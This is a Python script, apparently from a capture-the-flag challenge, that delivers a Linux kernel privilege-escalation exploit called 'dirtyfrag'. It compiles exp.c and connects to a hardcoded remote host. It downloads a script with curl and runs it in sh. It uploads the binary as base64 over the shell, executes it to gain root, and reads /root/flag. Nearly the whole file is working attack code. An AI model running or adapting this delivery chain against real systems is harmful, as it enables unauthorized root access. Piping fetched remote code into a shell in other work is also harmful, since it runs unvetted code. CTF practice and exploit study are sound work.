#!/usr/bin/env python3
from __future__ import annotations
import argparse, base64, socket, subprocess, sys, tempfile, time
from pathlib import Path

REMOTE_BINARY = "/tmp/dirtyfrag-exp"
REMOTE_B64 = "/tmp/dirtyfrag-exp.b64"
DEFAULT_STATE_SEED = "0x6d4a1f29b87ce503"
EXP_PATH = Path(__file__).parent / "exp.c"

def read_until(s, n, t=30, show=False):
    import time
    e = time.monotonic() + t
    d = bytearray()
    s.settimeout(0.5)
    while time.monotonic() < e:
        if any(x in d for x in n):
            return bytes(d)
        try:
            c = s.recv(65536)
        except socket.timeout:
            continue
        if not c:
            break
        d.extend(c)
        if show:
            sys.stdout.buffer.write(c)
            sys.stdout.buffer.flush()
    return bytes(d)

def compile_exp(seed):
    comp_src = EXP_PATH
    fd, nm = tempfile.mkstemp(prefix="exp-", suffix="")
    import os
    os.close(fd)
    out = Path(nm)
    cmd = ["gcc", "-O0", "-Wall", f"-DSTATE_SEED={seed}", "-o", str(out), str(comp_src), "-lutil"]
    subprocess.run(cmd, check=True)
    out.chmod(0o755)
    return out

def upload(s, p):
    import base64
    enc = base64.b64encode(p.read_bytes()).decode()
    s.sendall(b"stty -echo\n")
    read_until(s, (b"$ ",), 10)
    s.sendall(f"while IFS= read -r line; do if [ \"$line\" = __DIRTYFRAG_DONE__ ]; then break; fi; printf '%s\\n' \"$line\"; done > /tmp/dirtyfrag-exp.b64\n".encode())
    s.sendall(("\n".join(enc[i:i+2000] for i in range(0, len(enc), 2000)) + "\n__DIRTYFRAG_DONE__\n").encode())
    read_until(s, (b"$ ",), 60)
    s.sendall(b"base64 -d /tmp/dirtyfrag-exp.b64 > /tmp/dirtyfrag-exp\n")
    read_until(s, (b"$ ",), 10)
    s.sendall(b"chmod 0755 /tmp/dirtyfrag-exp\n")
    read_until(s, (b"$ ",), 10)
    s.sendall(b"stty sane\n")
    read_until(s, (b"$ ",), 10)

def main():
    import argparse
    p = argparse.ArgumentParser()
    p.add_argument("--host", default="20.219.0.137")
    p.add_argument("--port", type=int, default=3003)
    p.add_argument("--exp", type=Path)
    args = p.parse_args()
    tmp = None
    bin = args.exp if args.exp else compile_exp(DEFAULT_STATE_SEED)
    if not args.exp:
        tmp = bin
    try:
        with socket.create_connection((args.host, args.port), timeout=15) as s:
            d = read_until(s, (b"solution: ",), 30, show=True)
            if b"solution: " in d:
                ch = d.split(b"sh -s ", 1)[1].splitlines()[0].decode()
                solver = subprocess.run(["curl", "-sSfL", "https://pwn.red/pow"], check=True, capture_output=True, timeout=30)
                sol = subprocess.run(["sh", "-s", ch], input=solver.stdout, check=True, capture_output=True, timeout=180).stdout.strip()
                s.sendall(sol + b"\n")
                read_until(s, (b"$ ", b"# "), 30, show=True)
            upload(s, bin)
            s.sendall(b"DIRTYFRAG_VERBOSE=1 /tmp/dirtyfrag-exp --force-rxrpc\n")
            out = read_until(s, (b"page-cache patched", b"[!!!] HIT", b"# "), 360, show=True)
            if b"# " not in out:
                out += read_until(s, (b"# ",), 30, show=True)
            s.sendall(b"id; cat /root/flag; exit\n")
            ver = read_until(s, (b"}",), 30, show=True)
            sys.stdout.buffer.write(ver)
            return 0 if b"encryptid{" in ver else 1
    finally:
        if tmp:
            tmp.unlink(missing_ok=True)

if __name__ == "__main__":
    raise SystemExit(main())
